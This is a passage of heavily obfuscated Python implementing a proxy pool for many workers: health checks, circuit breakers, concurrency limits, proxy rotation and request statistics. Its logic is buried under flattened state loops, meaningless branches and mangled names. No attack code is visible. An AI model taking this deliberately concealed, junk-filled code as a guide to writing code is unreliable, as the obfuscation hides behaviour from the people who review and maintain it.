                                return ('HTTP_ERROR', False, llIlIIllIllIIIlIlIll)
                            else:
                                return ('HTTP_ERROR', False, llIlIIllIllIIIlIlIll)
                            break
                        if IIlIIIllllllIIIlI == 4809612:
                            lllIlIlIIIllIlllIll = getattr(requests, 'get')(IlIIlllIIIllIIIIIIIIIIII, proxies=proxies, timeout=timeout)
                            IIlIIIllllllIIIlI = 9378975
                            continue
                        if IIlIIIllllllIIIlI == 4689912:
                            IIlIIIllllllIIIlI = 4689912
                            continue
                except getattr(getattr(requests, 'exceptions'), 'ProxyError'):
                    return ('PROXY_CONNECT_FAILED', False, 0.0)
                except getattr(getattr(requests, 'exceptions'), 'ConnectTimeout'):
                    return ('PROXY_TIMEOUT', False, 0.0)
                except getattr(getattr(requests, 'exceptions'), 'ReadTimeout'):
                    return ('UPSTREAM_TIMEOUT', False, 0.0)
                except getattr(getattr(requests, 'exceptions'), 'RequestException'):
                    return ('PROXY_CONNECT_FAILED', False, 0.0)
                break
            if llllllllIlllIll == 6140988:
                IlIIlllIIIllIIIIIIIIIIII = getattr(getattr(self, 'config'), 'get')('proxy_test_url') or PROXY_TEST_URL
                llllllllIlllIll = 6740749
                continue
            if llllllllIlllIll == 7083944:
                if not IlIIlllIIIllIIIIIIIIIIII:
                    return ('NO_TEST_ENDPOINT', False, 0.0)
                llllllllIlllIll = 9099180
                continue
            if llllllllIlllIll == 4101675:
                if 3360 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3] == 3432:
                    llllIIIllIIllIIIIIIllll = 8001978
                    while True:
                        if llllIIIllIIllIIIIIIllll == 8001978:
                            llIlIIlIIIIIlllllIlIIlIl = 69762894 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3]
                            llllIIIllIIllIIIIIIllll = 5430976
                            continue
                        if llllIIIllIIllIIIIIIllll == 9640148:
                            llllIIIllIIllIIIIIIllll = 9640148
                            continue
                        if llllIIIllIIllIIIIIIllll == 1669748:
                            llllIlllllIlll = sum(lIIIlIIlIllIIIlI) + IllIllIIlllllIllIlIIllIl % 44 - llIlIIlIIIIIlllllIlIIlIl
                            break
                        if llllIIIllIIllIIIIIIllll == 5430976:
                            IllIllIIlllllIllIlIIllIl = (llIlIIlIIIIIlllllIlIIlIl * 9 ^ 3021342) & 65535
                            llllIIIllIIllIIIIIIllll = 6514680
                            continue
                        if llllIIIllIIllIIIIIIllll == 6514680:
                            lIIIlIIlIllIIIlI = [IllIllIIlllllIllIlIIllIl >> 4 & 255 for IlllIllIlllllIlIlIlI in range(9)]
                            llllIIIllIIllIIIIIIllll = 1669748
                            continue
                llllllllIlllIll = 6140988
                continue

    def refresh_pool(self, force=False):
        IIlIllIIlllIIIlII = 7399143
        while True:
            if IIlIllIIlllIIIlII == 4771549:
                IIlIllIIlllIIIlII = 1886093
                continue
            if IIlIllIIlllIIIlII == 7737446:
                IIlIllIIlllIIIlII = 6310550
                continue
            if IIlIllIIlllIIIlII == 6310550:
                with getattr(self, 'lock'):
                    IIllIIIlIIIlllIIlI = 9308629
                    while True:
                        if IIllIIIlIIIlllIIlI == 7332130:
                            setattr(self, 'refreshing', True)
                            break
                        if IIllIIIlIIIlllIIlI == 4519181:
                            if not force and getattr(IlllllIIllIIllIIll, 'time')() - getattr(self, 'last_refresh') < getattr(getattr(self, 'config'), 'get')('refresh_interval', 300):
                                return
                            IIllIIIlIIIlllIIlI = 7332130
                            continue
                        if IIllIIIlIIIlllIIlI == 5097641:
                            IIllIIIlIIIlllIIlI = 5097641
                            continue
                        if IIllIIIlIIIlllIIlI == 8598634:
                            IIllIIIlIIIlllIIlI = 4578843
                            continue
                        if IIllIIIlIIIlllIIlI == 4578843:
                            IIllIIIlIIIlllIIlI = 8598634
                            continue
                        if IIllIIIlIIIlllIIlI == 9308629:
                            if getattr(self, 'refreshing'):
                                return
                            IIllIIIlIIIlllIIlI = 4519181
                            continue
                IIlIllIIlllIIIlII = 1886093
                continue
            if IIlIllIIlllIIIlII == 1886093:
                try:
                    IIIIIIlllIIlIlIlIlIll = 6722547
                    while True:
                        if IIIIIIlllIIlIlIlIlIll == 1449518:
                            with getattr(self, 'lock'):
                                if lIIlllIllIlIlllll:
                                    setattr(self, 'pool', lIIlllIllIlIlllll)
                                setattr(self, 'last_refresh', getattr(IlllllIIllIIllIIll, 'time')())
                            break
                        if IIIIIIlllIIlIlIlIlIll == 8449527:
                            for url in llIIllllIIIIIlllII:
                                IlIIIlIIlllIlIIIIllIll = 4640844
                                while True:
                                    if IlIIIlIIlllIlIIIIllIll == 9534413:
                                        lIIlllIllIlIlllll[url] = {'url': url, 'healthy': lIlIIIlIlllIIllllll, 'failures': 0 if lIlIIIlIlllIIllllll else 1, 'last_checked': getattr(IlllllIIllIIllIIll, 'time')(), 'cooldown_until': 0.0, 'latency_ms': IIlllllIIlIIIlI if lIlIIIlIlllIIllllll else None, 'circuit_breaker': lIlIlllIIIlIIIl}
                                        break
                                    if IlIIIlIIlllIlIIIIllIll == 5121352:
                                        if lIlIIIlIlllIIllllll:
                                            getattr(lIlIlllIIIlIIIl, 'record_success')()
                                        else:
                                            getattr(lIlIlllIIIlIIIl, 'record_failure')()
                                        IlIIIlIIlllIlIIIIllIll = 9534413
                                        continue
                                    if IlIIIlIIlllIlIIIIllIll == 9305329:
                                        IlIIIlIIlllIlIIIIllIll = 9305329
                                        continue
                                    if IlIIIlIIlllIlIIIIllIll == 4191757:
                                        lIlIlllIIIlIIIl = IllllllIIlIlllIlIlIII(failure_threshold=3, cooldown_duration=getattr(getattr(self, 'config'), 'get')('cooldown', 30))
                                        IlIIIlIIlllIlIIIIllIll = 5121352
                                        continue
                                    if IlIIIlIIlllIlIIIIllIll == 4640844:
                                        status, lIlIIIlIlllIIllllll, IIlllllIIlIIIlI = getattr(self, 'check_proxy_health')(url)
                                        IlIIIlIIlllIlIIIIllIll = 4191757
                                        continue
                                    if IlIIIlIIlllIlIIIIllIll == 5771164:
                                        IlIIIlIIlllIlIIIIllIll = 4640844
                                        continue
                            IIIIIIlllIIlIlIlIlIll = 1449518
                            continue
                        if IIIIIIlllIIlIlIlIlIll == 9579733:
                            llIIllllIIIIIlllII = candidates[:IllIIIIlIIlIIIl]
                            IIIIIIlllIIlIlIlIlIll = 2555075
                            continue
                        if IIIIIIlllIIlIlIlIlIll == 6722547:
                            candidates = getattr(getattr(self, 'provider'), 'get_all_candidates')()
                            IIIIIIlllIIlIlIlIlIll = 1871490
                            continue
                        if IIIIIIlllIIlIlIlIlIll == 1757441:
                            IIIIIIlllIIlIlIlIlIll = 8449527
                            continue
                        if IIIIIIlllIIlIlIlIlIll == 2555075:
                            lIIlllIllIlIlllll = {}
                            IIIIIIlllIIlIlIlIlIll = 8449527
                            continue
                        if IIIIIIlllIIlIlIlIlIll == 1871490:
                            IllIIIIlIIlIIIl = getattr(getattr(self, 'config'), 'get')('max_proxies', 100)
                            IIIIIIlllIIlIlIlIlIll = 9579733
                            continue
                        if IIIIIIlllIIlIlIlIlIll == 4468038:
                            IIIIIIlllIIlIlIlIlIll = 9579733
                            continue
                finally:
                    with getattr(self, 'lock'):
                        setattr(self, 'refreshing', False)
                break
            if IIlIllIIlllIIIlII == 9010109:
                IIlIllIIlllIIIlII = 7399143
                continue
            if IIlIllIIlllIIIlII == 7399143:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][6] ^ 21 == 475:
                    IlIIIIlllIIlIIIII = 4973204
                    while True:
                        if IlIIIIlllIIlIIIII == 4324718:
                            lllIllIIlIIIIIlIIllIlI = sum(IIIIlIIIllIlllllllIII) + lIIIlllIIllIIlIllllll % 71 - IlIlIllIllIIllllIlIll
                            break
                        if IlIIIIlllIIlIIIII == 5329443:
                            lIIIlllIIllIIlIllllll = (IlIlIllIllIIllllIlIll * 4 ^ 10741716) & 4294967295
                            IlIIIIlllIIlIIIII = 6926186
                            continue
                        if IlIIIIlllIIlIIIII == 6926186:
                            IIIIlIIIllIlllllllIII = [lIIIlllIIllIIlIllllll >> 6 & 255 for IlllIllIIIIllIIIllIIIll in range(4)]
                            IlIIIIlllIIlIIIII = 4324718
                            continue
                        if IlIIIIlllIIlIIIII == 2829427:
                            IlIIIIlllIIlIIIII = 4973204
                            continue
                        if IlIIIIlllIIlIIIII == 8769344:
                            IlIIIIlllIIlIIIII = 2829427
                            continue
                        if IlIIIIlllIIlIIIII == 4973204:
                            IlIlIllIllIIllllIlIll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28] * 940055 + 242
                            IlIIIIlllIIlIIIII = 5329443
                            continue
                IIlIllIIlllIIIlII = 6310550
                continue

    def get_healthy_proxies(self):
        if 7564 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][13] == 7718:
            llllIIIIIIIlll = 1251345
            while True:
                if llllIIIIIIIlll == 5066416:
                    llllIIIIIIIlll = 5085363
                    continue
                if llllIIIIIIIlll == 3044690:
                    IIIIllIIIIIIllIlI = sum(IlIlIlIIIIllIlIIlI) + lIIIIIllIllIII % 96 - IllIllIIllIllIlllIII
                    break
                if llllIIIIIIIlll == 5928000:
                    llllIIIIIIIlll = 1251345
                    continue
                if llllIIIIIIIlll == 6709235:
                    IlIlIlIIIIllIlIIlI = [lIIIIIllIllIII >> 8 & 255 for lllIlllIllIIlllIlIlII in range(9)]
                    llllIIIIIIIlll = 3044690
                    continue
                if llllIIIIIIIlll == 5085363:
                    lIIIIIllIllIII = (IllIllIIllIllIlllIII * 9 ^ 1847415) & 16777215
                    llllIIIIIIIlll = 6709235
                    continue
                if llllIIIIIIIlll == 1251345:
                    IllIllIIllIllIlllIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15] * 64092 + 166
                    llllIIIIIIIlll = 5085363
                    continue
                if llllIIIIIIIlll == 2309575:
                    llllIIIIIIIlll = 5085363
                    continue
        with getattr(self, 'lock'):
            lllIIIIlIIIIIIIllllIIl = 1848465
            while True:
                if lllIIIIlIIIIIIIllllIIl == 5935263:
                    healthy = []
                    lllIIIIlIIIIIIIllllIIl = 7848772
                    continue
                if lllIIIIlIIIIIIIllllIIl == 9051051:
                    return healthy
                    break
                if lllIIIIlIIIIIIIllllIIl == 4452607:
                    lllIIIIlIIIIIIIllllIIl = 9051051
                    continue
                if lllIIIIlIIIIIIIllllIIl == 4902158:
                    lllIIIIlIIIIIIIllllIIl = 7848772
                    continue
                if lllIIIIlIIIIIIIllllIIl == 7848772:
                    for lIIlIIIIlIllIlllIIIlll in getattr(getattr(self, 'pool'), 'values')():
                        url = lIIlIIIIlIllIlllIIIlll['url']
                        IIllIIIIIlIlIIIIIlIll = lIIlIIIIlIllIlllIIIlll['circuit_breaker']
                        lllIIIIlIIIlll = getattr(getattr(self, 'concurrency'), 'get')(url, 0)
                        if lllIIIIlIIIlll >= getattr(self, 'max_concurrency_per_proxy'):
                            continue
                        if getattr(IIllIIIIIlIlIIIIIlIll, 'can_attempt')() and lIIlIIIIlIllIlllIIIlll['cooldown_until'] <= lIIIlIlIIIlIlIIlll and (lIIlIIIIlIllIlllIIIlll['healthy'] is not False):
                            getattr(healthy, 'append')(url)
                    lllIIIIlIIIIIIIllllIIl = 9051051
                    continue
                if lllIIIIlIIIIIIIllllIIl == 1848465:
                    lIIIlIlIIIlIlIIlll = getattr(IlllllIIllIIllIIll, 'time')()
                    lllIIIIlIIIIIIIllllIIl = 5935263
                    continue

    def acquire_proxy(self, url):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] == 8:
            llllIIIIIlIIIlllIIlII = 3076268
            while True:
                if llllIIIIIlIIIlllIIlII == 9113519:
                    llIlIIlIIIllll = (IlllllIlllIllllIlIIIl * 6 ^ 227749) & 16777215
                    llllIIIIIlIIIlllIIlII = 3982501
                    continue
                if llllIIIIIlIIIlllIIlII == 3982501:
                    llllIIIIIlIllIIlIIlIIl = [llIlIIlIIIllll >> 6 & 255 for IIllIlIIlIlIllIlIIIlIIl in range(6)]
                    llllIIIIIlIIIlllIIlII = 2055849
                    continue
                if llllIIIIIlIIIlllIIlII == 3076268:
                    IlllllIlllIllllIlIIIl = 28954276 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28]
                    llllIIIIIlIIIlllIIlII = 9113519
                    continue
                if llllIIIIIlIIIlllIIlII == 4289135:
                    llllIIIIIlIIIlllIIlII = 4289135
                    continue
                if llllIIIIIlIIIlllIIlII == 7290881:
                    llllIIIIIlIIIlllIIlII = 3076268
                    continue
                if llllIIIIIlIIIlllIIlII == 8334424:
                    llllIIIIIlIIIlllIIlII = 8334424
                    continue
                if llllIIIIIlIIIlllIIlII == 2055849:
                    IIIIIlIllIIlIlllllIlllII = sum(llllIIIIIlIllIIlIIlIIl) + llIlIIlIIIllll % 92 - IlllllIlllIllllIlIIIl
                    break
        with getattr(self, 'lock'):
            getattr(self, 'concurrency')[url] = getattr(getattr(self, 'concurrency'), 'get')(url, 0) + 1

    def release_proxy(self, url):
        if 13667 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][13] == 13857:
            llIllllIlIlIlllIl = 2730221
            while True:
                if llIllllIlIlIlllIl == 4311374:
                    lIIIlIlIllllIllIIllIIlI = [lIlIllllIlllIlllIIll >> 5 & 255 for IIIlllIIlIlIIIIIlIlIllll in range(7)]
                    llIllllIlIlIlllIl = 4909340
                    continue
                if llIllllIlIlIlllIl == 4909340:
                    IllIIIlIIIlIIIllII = sum(lIIIlIlIllllIllIIllIIlI) + lIlIllllIlllIlllIIll % 85 - lIIIllIlIlIIlIlIIIIIIIl
                    break
                if llIllllIlIlIlllIl == 4114664:
                    llIllllIlIlIlllIl = 7571439
                    continue
                if llIllllIlIlIlllIl == 7571439:
                    lIlIllllIlllIlllIIll = (lIIIllIlIlIIlIlIIIIIIIl * 7 ^ 5204694) & 4294967295
                    llIllllIlIlIlllIl = 4311374
                    continue
                if llIllllIlIlIlllIl == 2730221:
                    lIIIllIlIlIIlIlIIIIIIIl = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][10] * 515474 + 242
                    llIllllIlIlIlllIl = 7571439
                    continue
                if llIllllIlIlIlllIl == 8747167:
                    llIllllIlIlIlllIl = 4311374
                    continue
        with getattr(self, 'lock'):
            if url in getattr(self, 'concurrency'):
                getattr(self, 'concurrency')[url] = max(0, getattr(self, 'concurrency')[url] - 1)

    def mark_proxy_failed(self, url, category):
        if 9520 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] == 9639:
            lIlllIIlllllIIIII = 4883060
            while True:
                if lIlllIIlllllIIIII == 9491241:
                    lllIlIIIIIlllIl = (IIlIllllllIllIlIIlIIlI * 5 ^ 5823008) & 65535
                    lIlllIIlllllIIIII = 5805114
                    continue
                if lIlllIIlllllIIIII == 4883060:
                    IIlIllllllIllIlIIlIIlI = 13980968 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][17]
                    lIlllIIlllllIIIII = 9491241
                    continue
                if lIlllIIlllllIIIII == 1836518:
                    lIlllIIlllllIIIII = 1942609
                    continue
                if lIlllIIlllllIIIII == 1942609:
                    IlIIlIlllllIIIlIIII = sum(lIIIlllIllIIllIIIIlIII) + lllIlIIIIIlllIl % 61 - IIlIllllllIllIlIIlIIlI
                    break
                if lIlllIIlllllIIIII == 5805114:
                    lIIIlllIllIIllIIIIlIII = [lllIlIIIIIlllIl >> 12 & 255 for lIIIIIlIIIIIIIlIllIlIlI in range(5)]
                    lIlllIIlllllIIIII = 1942609
                    continue
        with getattr(self, 'lock'):
            getattr(self, 'release_proxy')(url)
            if url in getattr(self, 'pool'):
                IlIIlIlIllllllIIIIIII = 9588408
                while True:
                    if IlIIlIlIllllllIIIIIII == 6308759:
                        if getattr(IlIIIIIIlIIIlllIIII, 'state') == getattr(IllllllIIlIlllIlIlIII, 'OPEN'):
                            lllIllllllIIIIlllIlII['healthy'] = False
                            lllIllllllIIIIlllIlII['cooldown_until'] = getattr(IlllllIIllIIllIIll, 'time')() + getattr(getattr(self, 'config'), 'get')('cooldown', 30)
                        break
                    if IlIIlIlIllllllIIIIIII == 8739215:
                        IlIIIIIIlIIIlllIIII = lllIllllllIIIIlllIlII['circuit_breaker']
                        IlIIlIlIllllllIIIIIII = 8043475
                        continue
                    if IlIIlIlIllllllIIIIIII == 9588408:
                        lllIllllllIIIIlllIlII = getattr(self, 'pool')[url]
                        IlIIlIlIllllllIIIIIII = 8825568
                        continue
                    if IlIIlIlIllllllIIIIIII == 8043475:
                        getattr(IlIIIIIIlIIIlllIIII, 'record_failure')()
                        IlIIlIlIllllllIIIIIII = 6308759
                        continue
                    if IlIIlIlIllllllIIIIIII == 4277608:
                        IlIIlIlIllllllIIIIIII = 8043475
                        continue
                    if IlIIlIlIllllllIIIIIII == 9575632:
                        IlIIlIlIllllllIIIIIII = 4277608
                        continue
                    if IlIIlIlIllllllIIIIIII == 8825568:
                        lllIllllllIIIIlllIlII['failures'] += 1
                        IlIIlIlIllllllIIIIIII = 8739215
                        continue

    def mark_proxy_success(self, url, latency_ms):
        with getattr(self, 'lock'):
            getattr(self, 'release_proxy')(url)
            if url in getattr(self, 'pool'):
                IIIlIIllllIIlIIIlll = 9003075
                while True:
                    if IIIlIIllllIIlIIIlll == 7476109:
                        lIlIIIlllIIlIllIll['latency_ms'] = latency_ms
                        IIIlIIllllIIlIIIlll = 2030010
                        continue
                    if IIIlIIllllIIlIIIlll == 9003075:
                        lIlIIIlllIIlIllIll = getattr(self, 'pool')[url]
                        IIIlIIllllIIlIIIlll = 5451515
                        continue
                    if IIIlIIllllIIlIIIlll == 5451515:
                        lIlIIIlllIIlIllIll['healthy'] = True
                        IIIlIIllllIIlIIIlll = 6421837
                        continue
                    if IIIlIIllllIIlIIIlll == 2618843:
                        IIIlIIllllIIlIIIlll = 4064570
                        continue
                    if IIIlIIllllIIlIIIlll == 3848048:
                        getattr(IIIlIlIIlIIlIl, 'record_success')()
                        break
                    if IIIlIIllllIIlIIIlll == 2030010:
                        IIIlIlIIlIIlIl = lIlIIIlllIIlIllIll['circuit_breaker']
                        IIIlIIllllIIlIIIlll = 3848048
                        continue
                    if IIIlIIllllIIlIIIlll == 6421837:
                        lIlIIIlllIIlIllIll['failures'] = 0
                        IIIlIIllllIIlIIIlll = 7476109
                        continue
                    if IIIlIIllllIIlIIIlll == 4064570:
                        IIIlIIllllIIlIIIlll = 7476109
                        continue
                    if IIIlIIllllIIlIIIlll == 4551367:
                        IIIlIIllllIIlIIIlll = 5451515
                        continue

class lllIIIIlIllIIlI:

    def __init__(self, proxy_pool, strategy='round_robin'):
        IIIllIIlIIIIlI = 6472524
        while True:
            if IIIllIIlIIIIlI == 8348092:
                IIIllIIlIIIIlI = 1849133
                continue
            if IIIllIIlIIIIlI == 1849133:
                setattr(self, 'rr_index', 0)
                break
            if IIIllIIlIIIIlI == 6472524:
                IIIllIIlIIIIlI = 7312630
                continue
            if IIIllIIlIIIIlI == 7257705:
                setattr(self, 'lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                IIIllIIlIIIIlI = 1849133
                continue
            if IIIllIIlIIIIlI == 8767784:
                IIIllIIlIIIIlI = 1849133
                continue
            if IIIllIIlIIIIlI == 7312630:
                setattr(self, 'proxy_pool', proxy_pool)
                IIIllIIlIIIIlI = 2152127
                continue
            if IIIllIIlIIIIlI == 2853673:
                IIIllIIlIIIIlI = 6472524
                continue
            if IIIllIIlIIIIlI == 2152127:
                setattr(self, 'strategy', strategy)
                IIIllIIlIIIIlI = 7257705
                continue

    def get_proxy_for_worker(self, worker_id):
        lIIlIIlIlllIIllI = 3926127
        while True:
            if lIIlIIlIlllIIllI == 9266128:
                lIIlIIlIlllIIllI = 2843241
                continue
            if lIIlIIlIlllIIllI == 8619157:
                with getattr(self, 'lock'):
                    IIlllIlIllllIllIlIIII = 6645321
                    while True:
                        if IIlllIlIllllIllIlIIII == 5312942:
                            getattr(getattr(self, 'proxy_pool'), 'acquire_proxy')(IlllIIlIIIIlIIIllllIIIl)
                            IIlllIlIllllIllIlIIII = 6660362
                            continue
                        if IIlllIlIllllIllIlIIII == 6645321:
                            if getattr(self, 'strategy') == 'hash':
                                lIlIlllllIIIIIIIIIllIl = hash(worker_id) % len(healthy)
                                IlllIIlIIIIlIIIllllIIIl = healthy[lIlIlllllIIIIIIIIIllIl]
                            else:
                                IIIlIlllllllIlIIIIl = 1753780
                                while True:
                                    if IIIlIlllllllIlIIIIl == 3804896:
                                        IIIlIlllllllIlIIIIl = 3088688
                                        continue
                                    if IIIlIlllllllIlIIIIl == 4226257:
                                        setattr(self, 'rr_index', (getattr(self, 'rr_index') + 1) % len(healthy))
                                        IIIlIlllllllIlIIIIl = 4178209
                                        continue
                                    if IIIlIlllllllIlIIIIl == 3088688:
                                        IIIlIlllllllIlIIIIl = 4310871
                                        continue
                                    if IIIlIlllllllIlIIIIl == 4178209:
                                        IlllIIlIIIIlIIIllllIIIl = healthy[lIlIlllllIIIIIIIIIllIl]
                                        break
                                    if IIIlIlllllllIlIIIIl == 1753780:
                                        lIlIlllllIIIIIIIIIllIl = (getattr(self, 'rr_index') + worker_id) % len(healthy)
                                        IIIlIlllllllIlIIIIl = 4226257
                                        continue
                                    if IIIlIlllllllIlIIIIl == 4310871:
                                        IIIlIlllllllIlIIIIl = 4178209
                                        continue
                            IIlllIlIllllIllIlIIII = 5312942
                            continue
                        if IIlllIlIllllIllIlIIII == 4590761:
                            IIlllIlIllllIllIlIIII = 6645321
                            continue
                        if IIlllIlIllllIllIlIIII == 3068138:
                            IIlllIlIllllIllIlIIII = 6660362
                            continue
                        if IIlllIlIllllIllIlIIII == 6660362:
                            return IlllIIlIIIIlIIIllllIIIl
                            break
                        if IIlllIlIllllIllIlIIII == 1621521:
                            IIlllIlIllllIllIlIIII = 1621521
                            continue
                break
            if lIIlIIlIlllIIllI == 2843241:
                lIIlIIlIlllIIllI = 6232203
                continue
            if lIIlIIlIlllIIllI == 3926127:
                lIIlIIlIlllIIllI = 5176898
                continue
            if lIIlIIlIlllIIllI == 5176898:
                healthy = getattr(getattr(self, 'proxy_pool'), 'get_healthy_proxies')()
                lIIlIIlIlllIIllI = 2879828
                continue
            if lIIlIIlIlllIIllI == 2879828:
                if not healthy:
                    return None
                lIIlIIlIlllIIllI = 8619157
                continue
            if lIIlIIlIlllIIllI == 6232203:
                lIIlIIlIlllIIllI = 5176898
                continue

class IIIIIlIIIlIlIIIllIII:

    def __init__(self):
        lIIlIlllIlllIlllllIIIIlI = 7559971
        while True:
            if lIIlIlllIlllIlllllIIIIlI == 3452772:
                lIIlIlllIlllIlllllIIIIlI = 5040832
                continue
            if lIIlIlllIlllIlllllIIIIlI == 5040832:
                setattr(self, 'lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                lIIlIlllIlllIlllllIIIIlI = 8853455
                continue
            if lIIlIlllIlllIlllllIIIIlI == 8853455:
                getattr(self, 'reset')()
                break
            if lIIlIlllIlllIlllllIIIIlI == 7559971:
                lIIlIlllIlllIlllllIIIIlI = 5040832
                continue
            if lIIlIlllIlllIlllllIIIIlI == 4853853:
                lIIlIlllIlllIlllllIIIIlI = 4853853
                continue

    def reset(self):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28] ^ 251 == 297:
            llIllIlllIIIIllIlIllllll = 4997127
            while True:
                if llIllIlllIIIIllIlIllllll == 4997127:
                    IllllIlIIIlIIllIIIIlIll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][7] * 474773 + 250
                    llIllIlllIIIIllIlIllllll = 8475806
                    continue
                if llIllIlllIIIIllIlIllllll == 7007134:
                    llIllIlllIIIIllIlIllllll = 4997127
                    continue
                if llIllIlllIIIIllIlIllllll == 9386306:
                    llIlIIIIllIlllII = sum(IIIlIIllllIlIllllIIlIll) + IllIlIlllIIlII % 36 - IllllIlIIIlIIllIIIIlIll
                    break
                if llIllIlllIIIIllIlIllllll == 2625367:
                    llIllIlllIIIIllIlIllllll = 9386306
                    continue
                if llIllIlllIIIIllIlIllllll == 8475806:
                    IllIlIlllIIlII = (IllllIlIIIlIIllIIIIlIll * 7 ^ 8615222) & 16777215
                    llIllIlllIIIIllIlIllllll = 9986635
                    continue
                if llIllIlllIIIIllIlIllllll == 9986635:
                    IIIlIIllllIlIllllIIlIll = [IllIlIlllIIlII >> 10 & 255 for lIIllIIIlIIlIlIIIlIlIll in range(7)]
                    llIllIlllIIIIllIlIllllll = 9386306
                    continue
        with getattr(self, 'lock'):
            IIllIlIlIlIIIIIlllIIlI = 5281591
            while True:
                if IIllIlIlIlIIIIIlllIIlI == 6312686:
                    setattr(self, 'http_4xx', 0)
                    IIllIlIlIlIIIIIlllIIlI = 1225109
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 9542385:
                    setattr(self, 'start_time', getattr(IlllllIIllIIllIIll, 'time')())
                    break
                if IIllIlIlIlIIIIIlllIIlI == 9313823:
                    IIllIlIlIlIIIIIlllIIlI = 3271720
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 9649148:
                    IIllIlIlIlIIIIIlllIIlI = 1225109
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 7708147:
                    setattr(self, 'proxy_errors', 0)
                    IIllIlIlIlIIIIIlllIIlI = 6312686
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 4396246:
                    setattr(self, 'failed_requests', 0)
                    IIllIlIlIlIIIIIlllIIlI = 1396712
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 8925586:
                    setattr(self, 'connection_errors', 0)
                    IIllIlIlIlIIIIIlllIIlI = 7708147
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 1225109:
                    setattr(self, 'http_5xx', 0)
                    IIllIlIlIlIIIIIlllIIlI = 1489972
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 3676737:
                    IIllIlIlIlIIIIIlllIIlI = 5281591
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 7701569:
                    setattr(self, 'latencies', [])
                    IIllIlIlIlIIIIIlllIIlI = 1905694
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 1905694:
                    setattr(self, 'proxy_rotations', 0)
                    IIllIlIlIlIIIIIlllIIlI = 1614315
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 3271720:
                    setattr(self, 'successful_requests', 0)
                    IIllIlIlIlIIIIIlllIIlI = 4396246
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 1614315:
                    setattr(self, 'worker_restarts', 0)
                    IIllIlIlIlIIIIIlllIIlI = 9542385
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 5281591:
                    setattr(self, 'total_requests', 0)
                    IIllIlIlIlIIIIIlllIIlI = 3271720
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 1489972:
                    setattr(self, 'active_workers', 0)
                    IIllIlIlIlIIIIIlllIIlI = 7701569
                    continue
                if IIllIlIlIlIIIIIlllIIlI == 1396712:
                    setattr(self, 'timeouts', 0)
                    IIllIlIlIlIIIIIlllIIlI = 8925586
                    continue

    def record_request(self, category, latency_ms=None, status_code=None):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] == 100:
            llIlIlIllIIIIllllIIlIll = 3432839
            while True:
                if llIlIlIllIIIIllllIIlIll == 3432839:
                    llllIlIlIllIIIlIllll = 117500059 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2]
                    llIlIlIllIIIIllllIIlIll = 1045148
                    continue
                if llIlIlIllIIIIllllIIlIll == 4004203:
                    llIlIlIllIIIIllllIIlIll = 1045148
                    continue
                if llIlIlIllIIIIllllIIlIll == 3398944:
                    llIlIlIllIIIIllllIIlIll = 3432839
                    continue
